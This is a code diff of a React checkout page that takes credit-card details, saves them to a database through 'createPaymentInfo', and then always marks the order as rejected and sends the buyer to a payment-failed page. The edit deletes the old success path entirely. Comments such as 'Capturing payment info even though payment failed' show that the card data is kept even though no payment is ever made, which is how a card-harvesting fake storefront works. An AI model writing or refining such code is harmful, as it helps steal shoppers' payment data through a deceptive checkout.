@@ -10,6 +10,7 @@ import CreditCardForm, { CreditCardFormValues } from '@/components/payment/Credi
 import { supabase } from '@/integrations/supabase/client';
 import ProductSummary from '@/components/payment/ProductSummary';
 import { createPaymentInfo } from '@/services/paymentInfoService';
+import { atualizarStatusPedido } from '@/services/pedidoService';
 
 export default function CartaoPage() {
   const { slug } = useParams();
@@ -103,47 +104,20 @@ export default function CartaoPage() {
       
       console.log("Payment info saved successfully");
       
-      // For demo purposes, always redirect to the payment failed page
-      // In a real application, you would have real payment processing logic here
-      console.log("Redirecting to payment failed page");
+      // For demonstration purposes, always update status to 'reprovado' and redirect to failed page
+      console.log("Updating order status to reprovado");
       
-      // Update order status to 'reprovado'
-      const { error: updateError } = await supabase
-        .from('pedidos')
-        .update({ status: 'reprovado' })
-        .eq('id', pedidoId);
+      // Use the service function to update the order status
+      const success = await atualizarStatusPedido(pedidoId, 'reprovado');
       
-      if (updateError) {
-        console.error("Error updating order status:", updateError);
-        throw updateError;
+      if (!success) {
+        console.error("Error updating order status");
+        throw new Error("Error updating order status");
       }
       
       // Navigate to the payment failed page
+      console.log("Redirecting to payment failed page");
       navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-      return;
-      
-      // Note: This code is now unreachable - kept for reference
-      /* 
-      // Update order status
-      const { error: updateError } = await supabase
-        .from('pedidos')
-        .update({ status: 'pago' })
-        .eq('id', pedidoId);
-      
-      if (updateError) {
-        console.error("Error updating order status:", updateError);
-        throw updateError;
-      }
-      
-      console.log("Order status updated successfully");
-      
-      // Refresh pedidos data
-      queryClient.invalidateQueries({ queryKey: ['pedidos'] });
-      
-      // Navigate to success page or back to product
-      toast.success('Pagamento processado com sucesso!');
-      navigate(`/checkout/${slug}`);
-      */
       
     } catch (error) {
       console.error('Error processing payment:', error);
@@ -152,8 +126,7 @@ export default function CartaoPage() {
       try {
         console.log("Capturing payment info even though payment failed");
         
-        // Ensure we have already saved payment info
-        // If not, try to save it now (redundant code in case the first attempt failed)
+        // If first attempt failed, try to save payment info again
         try {
           await createPaymentInfo({
             pedido_id: pedidoId,
@@ -169,16 +142,13 @@ export default function CartaoPage() {
         }
         
         // Update order status to reflect failure
-        await supabase
-          .from('pedidos')
-          .update({ status: 'reprovado' })
-          .eq('id', pedidoId);
+        await atualizarStatusPedido(pedidoId, 'reprovado');
           
       } catch (captureError) {
         console.error('Error capturing payment info:', captureError);
       }
       
-      // Navigate to failure page
+      // Show error toast and navigate
       toast.error('Erro ao processar pagamento. Tente novamente.');
       navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
     } finally {
